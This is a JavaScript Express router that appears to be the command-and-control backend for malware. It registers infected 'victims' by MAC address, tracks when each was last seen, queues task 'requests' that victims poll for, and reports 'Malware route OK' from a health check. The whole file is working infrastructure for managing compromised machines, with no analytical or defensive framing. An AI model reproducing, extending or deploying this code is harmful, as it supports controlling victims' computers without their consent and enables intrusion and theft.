import { Router } from "express";
import Victim from '../models/victimModel.js';
import Request from '../models/requestModel.js';

const router = Router();

/**
 * Update last seen timestamp for a victim
 * @route POST /api/mw/updateLastSeen/:id
 */
router.post('/updateLastSeen/:id', async (req, res, next) => {
    try {
        const updatedVictim = await Victim.findOneAndUpdate(
            { _id: req.params.id },
            { lastSeen: Date.now() },
            { new: true }
        );
        res.json(updatedVictim);
    } catch (err) {
        next(err);
    }
});

/**
 * Get all unfulfilled requests for a specific victim
 * @route GET /api/mw/requests/:victimId
 */
router.get('/requests/:victimId', async (req, res, next) => {
    try {
        const requests = await Request.find({ victimId: req.params.victimId, fulfilled: false });
        res.json(requests);
    } catch (err) {
        next(err);
    }
});

/**
 * Get all requests (fulfilled and unfulfilled) for a specific victim
 * @route GET /api/mw/allRequests/:victimId
 */
router.get('/allRequests/:victimId', async (req, res, next) => {
    try {
        const requests = await Request.find({ victimId: req.params.victimId });
        res.json(requests);
    } catch (err) {
        next(err);
    }
});

/**
 * Register a new victim
 * @route POST /api/mw/registerVictim
 */
router.post('/registerVictim', async (req, res, next) => {
    try {
        const victim = new Victim({
            title: req.body.title,
            description: req.body.description,
            image: req.body.image || null,
            macAddress: req.body.macAddress,
        });

        const savedVictim = await victim.save();
        res.json(savedVictim);
    } catch (err) {
        next(err);
    }
});

/**
 * Update a victim
 * @route POST /api/mw/updateVictim/:id
 */
router.post('/updateVictim/:id', async (req, res, next) => {
    try {
        const updatedVictim = await Victim.findOneAndUpdate(
            { _id: req.params.id },
            req.body,
            { new: true }
        );
        if (!updatedVictim) {
            return res.status(404).json({ message: 'Victim not found' });
        }
        res.json(updatedVictim);
    } catch (err) {
        next(err);
    }
});
/**
 * Health check for malware route
 * @route GET /api/mw/health
 */
router.get('/health', (req, res) => {
    res.send('Malware route OK');
});

export default router;

